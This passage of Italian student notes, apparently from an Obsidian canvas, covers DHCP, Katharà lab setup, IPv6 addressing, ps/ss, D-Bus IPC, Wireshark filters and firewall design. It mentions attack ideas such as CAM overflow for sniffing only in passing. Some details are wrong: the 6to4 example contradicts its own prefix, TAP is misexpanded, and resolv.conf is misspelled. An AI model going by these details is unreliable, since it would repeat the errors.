`ARP` di `eth0`;\n\t- `ip neigh add 10.0.0.2 lladdr 00:11:22:33:44:55 dev eth0` - Aggiunge una associazione `ARP` a mano (`ip neigh del 10.0.0.2 dev eth0` la rimuove).","x":-10579,"y":8600,"width":759,"height":1072,"color":"4"},
		{"id":"57a7f3f226adc78b","type":"text","text":"# Come fa un host ad ottenere un indirizzo IP? (DHCP)\n\nInizialmente gli IP erano statici, quindi *hard-coded* sull'host ad opera dell'admin di rete (e.g. da `/etc/rc.config` su UNIX). Questo approccio manuale è obsoleto, ormai IP è dinamico.\n\nSi usa invece un ***protocollo Applicazione*** basato su UDP, ***DHCP*** (***Dynamic Host Configuration Protocol***). L'idea generale degli indirizzi IP è che vengano *presi in prestito*. La gestione di questi *leasing* sta al ***server DHCP***, spesso integrato nei router domestici. Questa la procedura:\n\n- Chi si connette alla sottorete cerca un server DHCP mandando broadcast un messaggio ***DHCP discover***, in cui specifica\n\t- **Sorgente** - `0.0.0.0` (\"non ho un IP\") `68`, la porta 68 è usata come standard lato client per ricevere i messaggi DHCP);\n\t- **Destinazione** - `255.255.255.255 67` broadcast sulla porta 67, su cui il server DHCP è in ascolto;\n\t- `Requested IP Address` - Eventualmente posso specificare l'IP che vorrei avere tra le opzioni facoltative. `0.0.0.0` significa \"boh, fai tu\";\n\t- **Transaction ID** - Dato che l'host non ha ancora un IP, tutti i messaggi DHCP vengono mandati broadcast. Questo valore viene scelto in modo casuale e assicura che non possano esserci conflitti;\n\t- Altre opzioni, ma si scende troppo nel tecnico e le ignoriamo;\n- Il server DHCP in ascolto sulla porta `67` vede il messaggio *discover* e risponde con una ***DHCP Offer***:\n\t- **Sorgente** - `223.1.2.5 67`, \"sono il server DHCP, e mi chiamo `Server Identifier`\";\n\t- **Destinazione** - `255.255.255.255 68`, faccio di nuovo broadcast perché il client non ha ancora un IP;\n\t- `yiaddr` - `223.1.2.4` (\"ti propongo questo IP\");\n\t- **Transaction ID** - Visto che il messaggio è ancora broadcast devo specificare a chi sto rispondendo;\n\t- **Lifetime** - Specifica quanto dura il leasing (e.g. `3600`, \"questo IP dura un'ora, poi devi chiederlo di nuovo\");\n- Questi primi due passaggi possono essere saltati se il client aveva già un indirizzo IP e vuole conservarlo;\n- A questo punto il client ha una proposta di IP. Chiede al server se può usarlo con una ***DHCP Request***. I campi sono gli stessi di una discover (il tipo di richiesta è specificato con l'`opzione 53 (DHCP Message Type`), il `Requested IP Address` (`opzione 50`) è quello dell'Offerta DHCP o il mio vecchio IP;\n\t- Anche la Request è broadcast, perché devo scegliere un solo server e comunicare ad altri eventuali server che hanno risposto con una Offer che il loro IP non verrà usato. Lo faccio tramite l'`opzione 54 (Server Identifier)`;\n- Finalmente, il server DHCP scelto dal client conferma l'IP con un messaggio ***DHCP ACK***.\n\t- Se però ho richiesto un IP non valido o non disponibile, il server risponderà con un messaggio ***DHCP NAK***, che in pratica mi costringe a ripetere tutta la procedura.\n\nOltre all'indirizzo IP del client, il server DHCP fornisce gli IP del gateway, di un server DNS e la subnet mask.","x":-18554,"y":835,"width":916,"height":983,"color":"4"},
		{"id":"2d824d6131fce094","type":"text","text":"# Laboratorio 1\n\n### `Ex1`\n\nFacciamo `lstart`. Si aprono `4` terminali corrispondenti ai nodi di rete da configurare, che mostrano i `log` delle operazioni già effettuate su di essi (entrambi questi comportamenti, i.e. apertura automatica dei terminali e stampa dei `log`, sono configurabili in `kathara settings`). In particolare,\n\n- ai `pc` viene preventivamente annullata ogni configurazione di `IP` sull'interfaccia `eth0` con il comando `ip addr flush eth0`: andrà settata manualmente;\n\t- Ogni nodo viene creato simulando una macchina con una scheda di rete, quindi ogni nodo possiede a priori un'interfaccia `eth0`.\n- `r1` viene effettivamente settato da `router`:\n\t- `ip addr replace 192.168.100.30/29 dev eth0` - Qualunque configurazione ci fosse prima, il tuo nuovo indirizzo su `eth0` è `192.168.100.30`. Inoltre, da `eth0` puoi raggiungere tutta la sottorete con `subnet mask 255.255.255.248`, i.e. tutti gli indirizzi che vanno da `192.168.100.24` (che identifica la rete, se ti fai i conti ha tutti `0` come parte `host`) a `192.168.100.31` (che è invece il `broadcast`, parte host di tutti `1`). Quindi `.30` è l'ultimo indirizzo utilizzabile, ed è stato assegnato al `router`. Restano come potenziali `host` gli `IP` che vanno da `.25` a `.29`;\n\t- `iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE` - `r1` sarà connesso ad Internet tramite `eth1`, e su tale interfaccia eseguirà un `NAPT` per mascherare gli `IP` di tutte le altre sottoreti (in questo caso solo `eth0`);\n\nA questo punto, per settare una configurazione di rete funzionante servono quattro elementi: `IP`, `netmask`, `IP` del `default gateway` e `IP` del `server DNS`. Ci sono tre modi per farlo.\n\n1. `interfaces` (`pc1`) - Tutte e quattro le informazioni vengono messe su un unico file, i.e. `/etc/network/interfaces.d/eth0` (sarebbe `/etc/network/interfaces`, ma se lo apri ti rendi conto che semplicemente prende le configurazioni dai file presenti nella cartella `interfaces.d`). Ci devi scrivere una roba del tipo\n\n```python\nauto eth0                                     # Attiva eth0 all'avvio (altrimenti dovrei sempre farlo io manualmente con `ifup eth0`)\niface eth0 inet static                        # Specifica l'interfaccia in modo statico\n\taddress 192.168.100.25/29                 # Definisce l'IP e la subnet mask\n\tgateway 192.168.100.30                    # Il router r1 è il default gateway\n\tdns-nameservers 151.100.4.2 151.100.4.13  # Quelli definiti da r1, ma potrei in linea di principio mettere quelli che voglio\t\n```\n\n- Se non ti ricordi la sintassi, `man interfaces`. Per rendere effettivi i cambiamenti devo far leggere al kernel questo nuovo file `interfaces` aggiornato, con il comando `ifup eth0` (`ifup` va a cercare `eth0` dopo una definizione di `iface` nel file di configurazione). Per spegnere l'interfaccia, `ifdown eth0`.\n\t- Di norma `ifup` aggiorna automaticamente il file `/etc/resolve.conf`, dove vengono salvati gli indirizzi dei `server DNS`. Questo non succede se si usa Docker, <span style=\"color:rgb(236, 155, 14)\">perché `ifup` non ha i permessi per farlo</span> (e comunque verrebbe resettato ad ogni riavvio dell'ambiente Katharà). Va fatto a mano.\n\n2. `ip` (`pc2`) - I primi due si settano con `ip add`, il `default gateway` con `ip route` e il `DNS` va scritto a mano nel file `/etc/resolve.conf`;\n\n3. `ifconfig` (`pc3`) - È la vecchia versione del comando `ip`, quindi in modo analogo (con `route` al posto di `ip route`.... perché `ip` non c'era).\n\n### `Ex2`\n\nLa stessa cosa di prima, ma con `DHCP`.\n\n- `r1` va settato `server DHCP`. Si può fare con `udhcpd`, che ha un file `/etc/udhcpd.conf`. Dopo aver settato tutto (in fondo ci sta altra roba, occhio!) lo si lancia con `udhcpd -f /etc/udhcpd.conf`. Qui per comodità invece di scrivere i comandi bash per modificare `udhcpd.conf` in `r1.startup` possiamo mettere il file di configurazione direttamente già scritto in `pc1/etc/udhcpd.conf`, `r1` lo caricherà direttamente all'avvio;\n\t- <span style=\"color:rgb(236, 155, 14)\">Questo è vero, ma sembra che la configurazione venga caricata sul nodo virtuale ***dopo*** che vengono eseguiti i comandi di startup. O meglio, se in `r1.startup` cerchi `udhcpd.conf` nel filesystem (tipo con `ls`) lui te lo trova, ma `udhcpd -f /etc/udhcpd.conf` eseguito subito dopo tra i comandi di `r1.startup` restituirà un errore di tipo \"`file non trovato`\". Boh, non voglio indagare, ci ho perso già troppo tempo. Tocca avviare il server a mano, altrimenti partirà con le impostazioni predefinite, quindi con i range di indirizzi sbagliati, e in pratica non funzionerà nulla</span>;\n- `pc1` di nuovo con `interfaces` (`iface eth0 inet dhcp`);\n- `pc2` con `dhclient`\n\n### `Ex3`\n\nQui tocca configurare due router. Tre, in realtà: bisogna mettere al router di frontiera le regole per raggiungere le reti interne. <span style=\"color:rgb(236, 155, 14)\">Oppure si può dire a quelli intermedi di pubblicizzare le reti private che hanno dietro? Oppure il pubblicizzare fa parte dei protocolli di routing automatici (e.g. RIP)? Check.</span>\n\n### `Ex 4`\n\n/etc/hosts overrides dns with hostnames\n\n\n- tcpdump per vedere cosa succede\n\t- strano comportamento di forwarding di r0 dovuto al longest prefix match. tocca settarlo a mano.\n- ovviamente una volta che configuri correttamente la prima sottorete, la seconda è un \"copia e incolla\"\n\nA quanto pare sta roba si fa a network infrastructures (1 semestre cybersec). Quindi dobbiamo recuperare ben due esami come prerequisiti a questo :)\n\nreverse dns lookup?\nping è SW, fa ICMP requests\n\n___\na questo punto usa wireshark, slides di lab wireshark\n\nref. slide 42. wireshark crea una nuova interfaccia che si attacca alla LAN A, in modo da sniffare roba e potenzialmente fare hijacking.\n\nsegue analisi dei pacchetti su wireshark e distinguo indirizzi IP/Mac (i mean ok bro)\n\n___\nSI È DIMENTICATO IL MICROFONO NELLA REC FINO A MO. DAJE.\n\nmo mi sa continua con wireshark. Sì, ma dice con un server che usa un HTTP primordiale.","x":-9570,"y":8600,"width":1259,"height":2413,"color":"4"},
		{"id":"a9d3163314090aa4","type":"text","text":"# Laboratorio 2\n\n# Lab 20/3\n\nlinux non ha tool interni per fare da router ipv6. usiamo radvd.\n\ndibbler è un po' vecchio per dhcpv6\ndnsmasq meglio, fa sia da server DHCP e DNS.\n\nsysctl sono i setup dei parametri. Sarebbe /proc/sys filesystem virtuale, in cui ogni file contiene il suo valore, tipo /proc/sys/abi/vsyscall32 se fai cat esce 1 (tipo `True`). Puoi modificare direttamente quelli o usare il comando sysctl da CLI.\n\nnella GUI, automatic = SLAAC. modificare la GUI = modificare parametri di sysctl.","x":-9570,"y":11438,"width":1259,"height":1462},
		{"id":"d3263c1925ddb36c","type":"text","text":"# IPv6\n\nLe prime tre versioni di IP non sono state neanche rilasciate ufficialmente, la quarta ha finito gli indirizzi assegnabili e la quinta è stata un mezzo fallimento. La sesta è uscita bene.\n\nUn indirizzo `IPv6` è un identificativo a `128 bit` ($\\sim 3.4\\cdot 10^{38}$ indirizzi) raggruppati in `8` gruppi da `16 bit` spesso rappresentati con notazione esadecimale (`16 bit`$\\to$ `4 hex`):\n```\n2001:0DB8:AAAA:1110:1000:0000:0000:0100\n```\n\nIn pratica ci sono due regole per scrivere meno roba possibile:\n\n- Ometti gli zeri iniziali nei gruppi (i.e. al posto di `0100` puoi scrivere `100`);\n- Comprimi la più lunga sequenza di zeri con doppio `:` (i.e. `1000:0000:0000:0100` diventa `1000::100`, non posso eliminare i tre zeri di `1000` perché sono significativi!).\n\t- Se ci sono due sequenze uguali si comprime solo la prima.\n\nCome in `IPv4`, anche qui diversi prefissi sono adibiti a diverse cose, ma stavolta sul serio. La IANA ha diviso la torta degli indirizzi in otto gruppi uguali (`bit` iniziali `000`, `001`, `010`, `011`, ...). `5` di queste fette sono totalmente inutilizzate, le restanti sono:\n\n- Tutto ciò che inizia con i bit `001` (i.e. il primo `hex` del primo gruppo è `2` o `3`, quindi sono tutti gli indirizzi da `2000::/64` a `3fff:ffff:ffff:ffff::/64`) è un ***Global Unicast Address*** e costituiscono quindi un ottavo di tutti i possibili indirizzi;\n\t-  Corrispondono agli ***indirizzi pubblici di `IPv4`***, e implementano la loro idea iniziale: ogni oggetto su Internet è univocamente determinato da un indirizzo `IP`,\n\t- Ho scritto in entrambi i casi \"`/64`\" perché con i `GUA` `IPv6` divide (quasi) sempre in modo simmetrico parte di rete e parte di host. O meglio, i primi  `3` gruppi sono di rete, il successivo di sottorete e gli altri `4` di host (`3-1-4 rule`);\n\t- Il sottogruppo `2001:DB8::/32` è dedicato alla \"***documentazione***\", i.e. ad usi tecnici e accademici. Questi indirizzi non vengono instradati su Internet_v6;\n\t- Il sottogruppo `2002::/16` (***6to4***) era in origine dedicato alla retrocompatibilità con `IPv4`. Vale a dire, prendo un `IPv4` (e.g. `192.88.99.1`) e lo scrivo in esadecimale (e.g. `C058:6301`). L'`IPv6` associato a questo `IPv4` è `2001:C058:6301::/48`.\n- La fetta di torta degli `IPv6` che iniziano con `000` è così divisa:\n\t- `::/128` è ***unspecified*** (i.e. `non ho un IP, sono ancora in fase di configurazione`);\n\t- `::1` è l'indirizzo di ***loopback***. Solo uno? Sì, non aveva alcun senso avere un'intera rete da $2^{24}$ indirizzi dedicata a questo (quando hanno fatto `IPv4` non avevano idea della direzione in cui si sarebbero sviluppate queste cose, quindi nel dubbio ne hanno riservati un botto. Ad oggi sappiamo che ne basta quasi sempre uno solo);\n\t- `::FFFF:0:0/96` simile a `6to4`, ad oggi non si usa quasi più.\n- La fetta `111` è così divisa:\n\t- `FC00::/7` (i.e. iniziano con `1111 110`) sono ***Unique Local Addresses***, i.e. gli ***indirizzi privati di `IPv4`***. In teoria si dividono a loro volta in due gruppi:\n\t\t- `FC00/8`, se vengono allocati da un server centrale (mai implementato);\n\t\t- `FD00/8`, se vengono assegnati in qualsiasi altro modo (è quello che si usa).\n\t- `FE80::/10` (i.e. iniziano con `1111 1110 10`, quindi vanno da `fe80:roba` fino a `febf:roba`) sono ***Link-Local Addresses*** (in pratica sono indirizzi ***MAC***);\n\t\t- Nota che gli indirizzi da `fe00:roba` a `fe7A:roba` non sono assegnati, quindi tendenzialmente riconosci un Link-Local perché inizia per `fe`.\n\t- `FF00::/8` sono indirizzi di ***Multicast***;\n\t- Un `111` iniziale significa che la prima lettera può essere sia una `E` che una `F`. Gli indirizzi che partono con `E` non sono stati assegnati, così come quelli che vanno da `F0` iniziale a `FC00` escluso. Insomma, di questa fetta sono stati assegnati solo alcuni spicchi.\n\nI principali temi da trattare sono l'***assegnazione degli indirizzi*** e le questioni di ***sicurezza***.","x":-10579,"y":11438,"width":759,"height":1462,"color":"6"},
		{"id":"a94d54939da6277a","type":"text","text":"# Assegnazione degli Indirizzi\n\nOgni Global Unicast nel mondo deve essere unico. Eh ok, ma in pratica come faccio?\n\nIntanto il problema si riduce subito a trovare solo gli ultimi `64 bit`, perché i primi sono rete e sottorete. Detto questo, ","x":-11588,"y":11438,"width":759,"height":614},
		{"id":"cb14f5abb112f7a1","type":"text","text":"# DHCPv4 (Reti)\n\nInizialmente gli IP erano statici, quindi *hard-coded* sull'host ad opera dell'admin di rete (e.g. da `/etc/rc.config` su UNIX). Questo approccio manuale è obsoleto, ormai IP è dinamico.\n\nSi usa invece un ***protocollo Applicazione*** basato su UDP, ***DHCP*** (***Dynamic Host Configuration Protocol***). L'idea generale degli indirizzi IP è che vengano *presi in prestito*. La gestione di questi *leasing* sta al ***server DHCP***, spesso integrato nei router domestici.\n\n- Cerco un server DHCP mandando una ***DHCP discover***, in cui specifico\n\t- **Sorgente** - `0.0.0.0` (\"non ho un IP\") `68` (standard lato client per DHCP);\n\t- **Destinazione** - `255.255.255.255 67` broadcast sulla 67 (standard lato server);\n\t- `Requested IP Address` - Eventualmente posso specificare l'IP che vorrei avere tra le opzioni facoltative. `0.0.0.0` significa \"boh, fai tu\";\n\t- **Transaction ID** - Dato che gli host non hanno ancora un IP, tutti i messaggi DHCP vengono mandati broadcast. Questo valore viene scelto in modo casuale e assicura che non possano esserci conflitti.\n- Il server DHCP vede il messaggio di `discover` e risponde con una ***DHCP Offer***:\n\t- **Sorgente** - `223.1.2.5 67`, \"sono il server DHCP, mi chiamo `Server Identifier`\";\n\t- **Destinazione** - `255.255.255.255 68` (broadcast, il client non ha ancora un IP);\n\t- `yiaddr` - `223.1.2.4` (\"ti propongo questo IP\");\n\t- **Transaction ID** - Devo specificare a chi sto rispondendo;\n\t- **Lifetime** - Specifica quanto dura il leasing (e.g. `3600`, \"questo IP dura un'ora\");\n- Se il client aveva già un indirizzo IP e vuole conservarlo salto questi primi due step;\n- A questo punto il client ha una proposta di IP. Chiede al server se può usarlo con una ***DHCP Request***. I campi sono gli stessi di una discovery (il tipo di richiesta è specificato con l'`opzione 53 (DHCP Message Type`), il `Requested IP Address` (`opzione 50`) è quello dell'Offerta DHCP o il mio vecchio IP;\n\t- Anche la Request è broadcast, perché devo scegliere un solo server e comunicare ad altri eventuali server che hanno risposto con una Offer che il loro IP non verrà usato. Lo faccio tramite l'`opzione 54 (Server Identifier)`;\n- Finalmente, il server DHCP scelto dal client conferma l'IP con un messaggio ***DHCP ACK***.\n\t- Se però ho richiesto un IP non valido o non disponibile, il server risponderà con un messaggio ***DHCP NAK***, che in pratica mi costringe a ripetere tutta la procedura.\n\nOltre a ciò, il server DHCP fornisce gli IP del gateway, di un server DNS e la subnet mask.","x":-10583,"y":9908,"width":759,"height":1105,"color":"4"},
		{"id":"6f55ee57ba880979","type":"text","text":"# `ps` & `ss` (`Processi` e `Socket`)\n\nIl comando `ps` (`Process Status`) serve a visualizzare i ***processi*** in esecuzione. Eseguito senza ulteriori opzioni mostra tutti i processi legati alla `shell` corrente (simile a `jobs`, ma quest'ultimo mostra solo quelli in background). Dopodiché abbiamo\n\n- `-e` (analogo a `--all`) - Mostra tutti i processi;\n- `-f` - Mostra il formato completo (`PPID`, `CPU Time`, ...);\n\t- `-l` estende ulteriormente.\n- `-u user` - Mostra solo i processi dell'utente `user`;\n- `-p PID` - Mostra i dettagli del processo con un certo `PID`;\n- `-t tty` - Mostra i processi associati ad uno specifico terminale `tty`;\n- `a` - Mostra i processi di tutti gli utenti con un terminale attivo;\n- `x` - Mostra anche i processi senza terminale, ma dell'utente corrente;\n\t- `ax` mostra tutti i processi, come `-e` e `--all`.\n- `u` - Estende le informazioni (mostra più colonne).\n- `f` (analogo a `--forest`) - Mostra l'albero gerarchico dei processi;\n- `--sort=-%XXX` - Ordina secondo `XXX = cpu` (uso della `CPU`) o analogo con `mem`.\n\nGiocando con questa roba potresti ad esempio accorgerti che c'è un processo, i.e.\n```\n/lib/systemd/systemd --user\n```\nche è il padre di tutti i processi utente. Questo perché gestisce `systemctl --user`, i.e. ti permette di usare i servizi nello spazio utente. Con `ps --forest -u user` puoi vedere rapidamente tutti i servizi attivi di `user`.\n\nIl comando `ss` (`Socket Statistics`) ispeziona invece tutte le possibili ***connessioni***.\n\n- `-a` - Mostra tutti i socket\n- `-t`, `-u` - Filtra, rispettivamente, le sole connessioni `TCP`/`UDP`;\n- `-x` - Filtra le sole connessioni `UNIX`, cfr. ***Inter-Process Communication (IPC)***;\n- Oltre a queste due macro-categorie (`TCP/UDP` e `UNIX`) ne esistono altre:\n\t- `RAW` - Accesso diretto a `IP`. Alcuni comandi (e.g. `ping`, `tcpdump` e i firewall) non usano il livello di Trasporto;\n\t- `FRAG` - Usata per gestire i `frammenti IP` non ancora ricomposti;\n\t- `INET` - Generica connessione di rete, i.e. qualsiasi cosa non meglio specificata che coinvolga `IP` (e che quindi non sia locale, come invece è una connessione `UNIX`).\n- `-l` - Mostra solo i socket in ascolto;\n- `-n` - Mostra gli `IP` in formato numerico (non risolve i nomi);\n- `-p` - Mostra il nome del processo associato al socket;\n- `-s` - Mostra un riassunto statistico delle connessioni.","x":-8061,"y":9908,"width":759,"height":1105,"color":"4"},
		{"id":"86afbb36e3ee27dc","type":"text","text":"# SPACING","x":-12420,"y":11260,"width":250,"height":235,"color":"5"},
		{"id":"45207dd63fbbe55b","type":"text","text":"# Indirizzi Link-Local & DHCPv6\n\nUn indirizzo `IPv6` di tipo Link-Local fa le veci di un indirizzo `MAC`, motivo per cui esiste solo su link locale tra due dispositivi. Non compaiono quindi nelle tabelle di routing, ed ogni interfaccia `IPv6` deve averne almeno uno (l'importante è che sia unico lungo il link).\n\nPosto che iniziano quasi sempre per `FE80`, posso generare un Link-Local in modo manuale, randomizzando gli ultimi `64 bit` (tanto è improbabile sceglierne due uguali sullo stesso link) oppure sfruttando il `MAC` univoco di partenza: prendo i `48 bit` originali e ci aggiungo in mezzo i `16 bit FFFE`, poi flippo il settimo `bit` (\"don't ask why\").\n\n","x":-11588,"y":9908,"width":759,"height":1105},
		{"id":"c458828e446d076f","type":"text","text":"# Modalità Bridged\n\nOgni `VM` si connette alla rete dell'`host` tramite la ***modalità bridged***, i.e. \"estendendo\" il cavo `ethernet` dell'`host` e collegandosi alla stessa interfaccia. In questo caso, il `router` vedrà la `VM` come un secondo `host` connesso sulla stessa interfaccia, e gli assegnerà un `IP` unico sulla sua `LAN`.\n\nTutto questo potrebbe rompersi se l'`host` è connesso in `WiFi`. Per come funziona, `WiFi` ha bisogno di un `MAC` univoco per ogni connessione, e se crei un'interfaccia virtuale di tipo `bridge` (e.g. `br0`) la scheda `WiFi` (interfaccia `wlan0`) potrebbe letteralmente rifiutarsi e scartare i pacchetti diretti a questo secondo `MAC` fittizio che non è il suo. Inoltre, potrebbe essere il `router` stesso a non accettare una situazione di tipo \"stesso client, diversi `MAC`\".\n\nCi sono diverse soluzioni a questa cosa, tra cui `NAPT` (i.e. traduzione degli indirizzi a livello di rete) e l'uso di un'interfaccia `TAP` (`Terminal Access Point`, che in pratica simula un cavo `ethernet` virtuale tra `VM` e `host`, contrapposto ad una rete `TUN`). In pratica, se l'`host` è connesso in `WiFi` e vuole far funzionare un bridge si deve comportare da `router`.\n\nOra, Linux ha un suo sistema di Bridges (`Linux Bridges`) integrato nel kernel. Per creare la propria rete tra `container`, Katharà può scegliere di appoggiarsi su questo sistema.\n\nL'alternativa è un sistema più complesso, basato su un SW che gira in `user mode` detto `VDE` (`Virtual Distributed Ethernet`). Questo metodo richiede configurazione aggiuntiva, perché simula il comportamento di uno switch (quindi dovrei definire CAM Tables, VLAN, e altre cose simpatiche).\n\nVisto che non ci va di configurare cose in più, usiamo `katharamp` invece di `katharamp_vde` in `Docker Network Plugin Version` (`kathara settings`).","x":-10329,"y":7440,"width":759,"height":924,"color":"4"},
		{"id":"780a7728bf920c66","type":"text","text":"# Wireshark","x":-8061,"y":8600,"width":759,"height":1072},
		{"id":"6dcfdc201d597c93","type":"text","text":"# alternativa\n\ninvece di mettere i comandi bash in .startup, posso mettere i file di configurazione in pc1/etc/network/eccetera, e mettere in pc1.startup la linea `etc/init.d/networking restart`\n\nNOOO NON CREDO, CAPIRE MEGLIO\n\n\nse devo copiare un file da dentro un nodo (e.g. r1) a fuori, nel terminale standard `docker cp r1:/path/to/file ./file.conf`\n","x":-5870,"y":8891,"width":557,"height":367},
		{"id":"9c512660e25af682","type":"text","text":"# Inter-Process Communication (IPC)\n\nSe vuoi costruire condivisione di informazioni tra processi in modo più sofisticato rispetto ad un file condiviso o a semplici segnali, puoi usare una sorta di paradigma ***client-server*** che si appoggia sui ***Bus*** e che su di essi apre dei ***Socket UNIX***.\n\nSi può fare un'analogia con le reti:\n\n- Il `bus` è l'analogo di ***Internet***: tutti si possono collegare ad esso per inviare o per ricevere messaggi. Ne abbiamo diversi (e.g. `session` per i processi utente, `system` per quelli di sistema), e in pratica costituisce l'architettura della \"LAN\";\n- I processi che vogliono inviare/ricevere messaggi sono l'analogo di ***client e server***. Servono quindi due cose:\n\t- Ad ogni processo connesso al `bus` viene assegnato un nome univoco temporaneo (e.g. `:1.42`) che funge da ***indirizzo IP***. Se però il processo (e.g. `standardservice`) offre un servizio molto specifico (e.g. `Sum`) può scegliere di esporsi alla \"LAN\" usando come identificativo un ***well-known-name*** che richiama un \"well-known-service\" (e.g. `standardservice.Sum`). Questo significa che gli altri processi possono accedere ai servizi standard indipendentemente da chi è lo specifico processo che lo implementa (sarebbe un disastro con i nomi casuali!);\n\t\t- In pratica, `org.freedesktop.NetworkManager` è un well-known-name di un processo che si pubblicizza come `NetworkManager` e che offre metodi come `ActivateConnection(parametri)` e `GetActiveConnections()` secondo gli standard definiti da `org.freedesktop` (essendo i nomi gerarchici come `DNS`, visitando il sito `freedesktop.com` ti rendi conto che è letteralmente un progetto che definisce standard per cose su `UNIX`);\n\t\t- Con un ***codice malevolo*** potrei pubblicizzarmi come voglio e fare quello che voglio? ... ***ni***. `DBus` ha delle contromisure, messe in atto da `dbus-demon`. Ad esempio, per presentarti come `NetworkManager` ti servono le autorizzazioni;\n\t\t- Il nome casuale `:1.42` è gestito in modo incrementale per evitare conflitti.\n\t- Dopo l'`IP`, su `TCP/IP` mi serve la ***porta***. Ma l'obiettivo è solo quello di identificare un servizio offerto! Segue che qui l'analogo delle porte sono i metodi esposti dal processo che si pubblicizza sul `bus`. In pratica uso il nome del servizio e attacco in coda il metodo (e.g. `org.freedesktop.NetworkManager.GetActiveConnections`).\n- In `TCP/IP`, La coppia `IP/Porta` crea di fatto un ***socket***. Qui è leggermente diverso. Il demone `dbus` crea un socket associato al bus e si propone come server per tutti i processi. I processi si connettono come client e specificano chi vogliono raggiungere (tramite well-known-name o nome univoco temporaneo). Di fatto, per mantenere il parallelismo con `TCP/IP` per ogni connessione tra due processi abbiamo in realtà due connessioni client-server (`Processo A - dbus` e `dbus - Processo B`). Di fatto, quindi, `dbus` fa sia (de)multiplexing sia \"***routing***\".\n\nQuesto era per rispondere a \"uuh cosa sono tutte queste cose quando eseguo `ss -x`?!\".\n\nE fu così che non si laureò mai...","x":-7052,"y":9908,"width":759,"height":1105,"color":"4"},
		{"id":"54d3afedf0d0dad7","type":"text","text":"# SPACING","x":-6120,"y":9437,"width":250,"height":235,"color":"5"},
		{"id":"1aee8251fddfc28d","type":"text","text":"# Wireshark Lab - 07/03\n\nhijacking\n\nalternative per sniffare traffico\n\n- dumpcap solo capture dei packet, no analysis\n- tcpdump less flexible than wireshark (no display filter, no GUI)\n- netflow - non fa deep packet inspection, fa solo un sommario di quello che sta succedendo (conta i pacchetti, i byte, RTT, ...)\n- ne ha saltato uno\n\nsono tutti basati sulla libreria `pcap`.\n\nl'idea di wireshark è di dissezionare il pacchetto e trovare i limiti del frame (DLL), segmento (Trasporto), pacchetto (Applicazione).\n\nè scemo, nel senso che se vede una roba su porta 80 prova a dissezionarlo pensando sia http. il che ha senso, ma puoi fregarlo usando porte non standard.\n\ndue tipi di filtri\n\n- capture - quelli esclusi dal filtro vengono proprio persi\n- display - quelli esclusi non vengono mostrati (ma ws li ha presi!)\n\nberkley packet filter (BPF) syntax\n```\nprotocol(tcp, ip6, ...) direction (src, dst) type\n```\ncon `type` puoi fare N cose, tra cui operatori e simili. vedi slides\n\n","x":-7052,"y":8758,"width":759,"height":757,"color":"1"},
		{"id":"213cb7424970c6c4","type":"text","text":"# Lec 28/02\n\nfuzzy attack?\n\nwireshark e simili modificano direttamente la NIC per entrare in promiscuous mode? questa cosa diventa difficile se la rete è segmentata (faccio diverse VLAN? o comunque lo switch è più intelligente del previsto e manda la roba solo al vero destinatario)\n\nARP requests are always broadcast ethernet packets\n\nposso collegare uno switch ad un altro switch. questo significa che ad una porta possono corrispondere più MAC\n\nARP tables for hosts, called CAM for switches (HW-based, so fast. in fact, destination is the very first info in ethernet so that switch can decide output port asap)\n\n- CAM overflow - costringo lo switch a non ricordarsi le cose in modo da fargli fare broadcast ogni volta (mi interessa per fare sniffing, altrimenti i packet non mi arrivano!)\n\nInternet non è una grande ethernet network perché sta roba si basa sui broadcast. per risolvere questo problema crei IP. similmente a come poi visto che è inefficiente fare routing su cose troppo grandi dividi in ISP (e poi BGP ecc)\n\nSapienza è connessa a GAR (?) che collega tutte le università italiane\n\nbroadcast su IP poco comune (satelliti, ping), di norma si ignora (per ovvi motivi). multicast più comune, specie su IPv6\n\nClassi ABCDE: guarda il primo 0. \n\n- A - 0xxxxxxx fino a 127\n- B - 10xxxxxx da 128 a 191, ecc...\n- C\n- D - 1110xxxx (multicast)\n- E - (unused) 111110xx\n\nnon si usa più perché la classe A è troppo grande, quindi CIDR (parte network e parte host)\n\nprivate networks (RFC1918, i.e. non-routable IPs) definisce 10.xxx.xxx.xxx, 172.16.xxx.xxx e 192.168.xxx.xxx (guarda slide 34)\n\nbroadcast è sempre \"tutti 1 nella host part\", anche se questo non produce in generale in CIDR un 255!","x":-8400,"y":4251,"width":759,"height":997},
		{"id":"5e2d8b969aca28e1","type":"text","text":"# `nftalbes`??","x":-6293,"y":11438,"width":350,"height":154},
		{"id":"0a2425b5c932bbd1","type":"text","text":"# 04.04 - Firewall\n\ntrade off tra effort di deep packet inspection ed effettiva efficacia del firewall.\n\nusiamo iptables e un altro perché sono open source, diverse aziende ne usano diversi (con diverse sintassi). Tre livelli di astrazione:\n\n- policy (natural language)\n- corresponding filter rules\n- implementing filters /w right syntax\n\nraro andare in application layer, al più ci si ferma a trasporto (filtro su TCP/UDP). Se serve c'è un filtro apposito per l'application layer, ma più interno: l'idea è avere una catena di firewall tali che quello esterno filtra su IP (DLL non è davvero necessario in genere), poi dentro faccio un filtro \"finer grain\". Credo si chiami defense-in-depth: multiple overlapping system, anche con redundancy (se uno di loro faila, ce ne sono altri), è balance tra difesa e complessità.\n\nUn firewall è un router che però non forwarda tutto. Con che logica? Le filter rules. Access Control List (ACL) è il primo livello di filtro.\n\nslide 7 - principi di design che lui dice \"potrei entrare in dettaglio, ma suvvia, sono ovvi\". Guardali lo stesso perché sta gente fa cybersec da quando e nata e tu no.\n\nhost based - firewall su pacchetti diretti ad un particolare host, non filtro sulla rete in generale. ufw, pf su unix?\n\nACL è il firewall come te lo immagini, si chiama screening router. whitelist/blacklist differenti per incoming/outcoming traffic. Questo setup è stateless (\"no context, only content\")\n\nLivello 2 - Dual Homed Host (or Bastion Host). Non solo ACL, qualcosa in più: è dedito a proteggere con un SW, ma ha SOLO quello. Si parla di hardening quando tolgo tutte le altre possibili cose fancy che potrebbero rivelarsi vulterabilità.\n\nDMZ - piccola rete interna che posso esporre ad internet.\n\nGuarda slides per configurazioni possibili.\n\nslide 17 - ad esempio per accedere ad internet dall'internal zone potrei essere costretto a passare per la dmz.\n\nslide 21 - nota che outgoing interface... no non ho capito. A me sembra ovvio ma forse no.\n\nrules sono organizzate in chains, vedi HowToFirewall sopra.\n\nvedi slides per esempi di regole\n\nslide 31 - \"blocco il traffico incoming con IP identici a quelli interni\" eh ma con gli indirizzi privati che ormai sono pubblici? che facciamo?\n\nmolti firewall bloccano lo spoofing. potrei però appoggiarmi ad un proxy e dirgli di fare spoofing al posto mio?\n\nporta >1023 -> è una risposta. poi 